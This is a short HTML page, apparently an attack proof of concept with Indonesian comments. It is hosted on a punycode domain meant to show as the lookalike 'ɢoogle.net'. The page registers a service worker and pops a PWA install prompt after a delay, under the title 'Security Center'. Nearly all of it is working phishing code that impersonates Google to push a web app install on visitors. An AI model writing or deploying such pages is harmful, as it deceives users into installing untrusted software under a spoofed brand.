<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="manifest" href="manifest.json">
    <title>Security Center</title>
</head>
<body>
    <script>
        // Saat user mengunjungi xn--oogle-z3d.net, 
        // Address Bar akan menampilkan "ɢoogle.net".
        
        // Langsung kita tembak PWA Install Prompt dari bug lu!
        navigator.serviceWorker.register('sw.js');
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            setTimeout(() => {
                e.prompt(); // Memanggil dialog install PWA
            }, 1000);
        });
    </script>
</body>
</html>
